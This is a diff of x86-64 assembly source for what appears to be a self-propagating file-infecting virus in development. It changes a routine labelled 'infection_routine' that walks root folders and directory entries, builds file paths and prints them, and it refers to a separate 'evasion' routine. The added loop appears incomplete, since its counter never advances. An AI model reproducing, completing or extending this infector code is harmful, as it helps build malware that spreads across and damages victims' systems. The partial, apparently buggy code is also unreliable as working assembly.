@@ -195,11 +195,11 @@ infection_routine:
     push rbx
     push rcx
     push r9
+    push r8
 
 ; iterate through root folders
 .roots_iter:
-    push rdi
-
+    mov r8, rdi
 
     ; for each folder, iterate through all the entities
     mov rax, SYS_OPEN
@@ -227,14 +227,50 @@ infection_routine:
     js exit_err
     jz .file_loop_end_infection
 
-; TODO: copy dirent_read_loop_start_evasion here
+    mov rcx, 0
 
+; TODO: copy dirent_read_loop_start_evasion here
+.dirent_read_loop_start_infection:
+    cmp rcx, rax
+    jge .dirent_read_loop_end_infection
+
+    mov rbx, rsp ; og stack w/ dirent is now at rbx
+	push rax
+
+	mov rdi, r8
+    call strlen
+
+    sub rsp, BLAZEIT
+    mov rsi, r8
+    mov rdi, rsp
+    mov rdx, rax
+    call memcpy
+
+	mov rdi, rax
+    lea rsi, [rel slash]
+    mov rdx, 1
+    call memcpy
+
+    lea rsi, [rbx + rcx + dirent.d_name]
+    mov rdi, rax
+    call strcpy
+
+    ; print stuff
+    lea rdi, [rsp]
+    call write_string_nl
+    add rsp, BLAZEIT
+    pop rax
+
+
+.dirent_read_loop_end_infection: 
+    add rsp, DIRENT_BUF_SZ
+    jmp .file_loop_start_infection
 
 .file_loop_end_infection:
     add rsp, DIRENT_BUF_SZ
 
     
-    pop rdi
+    mov rdi, r8
     call strlen
     inc rax
     add rdi, rax
@@ -262,6 +298,7 @@ infection_routine:
 
     ; if entity is a folder, call infection_routine on that folder
 .ret:
+    pop r8
 	pop r9
     pop rcx
     pop rbx
